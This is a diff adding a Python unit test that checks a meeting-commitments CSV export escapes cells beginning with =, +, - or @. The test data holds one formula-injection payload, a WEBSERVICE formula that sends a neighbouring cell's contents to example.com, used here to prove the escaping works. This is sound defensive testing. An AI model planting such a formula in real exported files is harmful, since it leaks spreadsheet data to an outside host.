@@ -488,6 +488,20 @@ class CommitmentExportTest(unittest.TestCase):
         self.assertIn("презентация (Анна)", todo[1])
         self.assertIn("Задача,Кто", export_text(items, "csv"))
 
+    def test_csv_cells_never_run_as_formulas(self):
+        # the title of an invitation is written by whoever sent it; Excel runs a cell starting with = + - @
+        import csv
+        import io
+
+        from app.commitments import export_text
+        items = [{"who": "@Анна", "to_whom": "", "what": "+1 презентация", "due": "", "status": "open",
+                  "meeting_title": '=WEBSERVICE("http://example.com/?"&A2)', "meeting_date": "2026-10-21"}]
+        row = list(csv.reader(io.StringIO(export_text(items, "csv"))))[1]
+        self.assertEqual(row[0], "'+1 презентация")
+        self.assertEqual(row[1], "'@Анна")
+        self.assertEqual(row[4], '\'=WEBSERVICE("http://example.com/?"&A2)')
+        self.assertEqual(row[5], "2026-10-21")
+
 
 class UrlImportTest(unittest.TestCase):
     def test_download_then_queue(self):
